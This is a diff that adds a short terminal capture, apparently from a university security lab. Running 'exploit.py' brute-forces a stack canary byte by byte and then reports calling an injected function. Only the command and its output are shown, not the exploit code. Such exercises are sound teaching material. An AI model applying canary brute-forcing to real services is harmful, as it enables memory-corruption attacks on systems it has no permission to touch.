@@ -1,0 +1,10 @@
+student@uso:~/socket-ssp$ python exploit.py
+Canary byte 0 is 0x00
+Canary byte 1 is 0x0c
+Canary byte 2 is 0xda
+Canary byte 3 is 0x55
+Canary byte 4 is 0x89
+Canary byte 5 is 0x3c
+Canary byte 6 is 0x40
+Canary byte 7 is 0x71
+Exploit result: Called injected function.
